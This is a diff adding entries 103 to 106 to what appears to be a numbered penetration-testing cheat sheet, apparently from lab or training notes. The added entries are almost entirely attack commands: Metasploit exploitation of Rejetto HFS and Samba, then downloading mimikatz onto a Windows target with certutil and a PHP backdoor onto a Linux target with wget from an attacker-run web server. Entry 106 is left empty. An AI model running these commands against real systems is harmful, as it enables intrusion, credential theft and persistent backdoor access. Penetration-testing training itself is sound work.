@@ -1999,5 +1999,41 @@ shell
 chmod +x LinEnum.sh
 ./LinEnum.sh
 ```
+103) Setting Up A Web Server With Python
+```
+python -m SimpleHTTPServer 80
+python -m http.server 80
+```
+104) Transferring Files To Windows Targets
+
+```
+nmap -sV -p 80 10.2.30.185
+searchsploit rejetto
+msfconsole
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.2.30.185
+exploit
+cd /usr/share/windows-resources/mimikatz/x64
+python3 -m http.server 80
+cd C:\\
+mkdir Temp
+cd Temp
+shell
+certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatz.exe
+```
+105)  Transferring Files To Linux Targets
+```
+ifconfig
+nmap -sV 192.196.45.3
+msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOSTS 192.196.45.3
+exploit
+cd /usr/share/webshells/php/
+python3 -m http.server 80
+cd /temp
+wget http://192.196.45.2/php-backdoor.php
+```
+106)
 
 
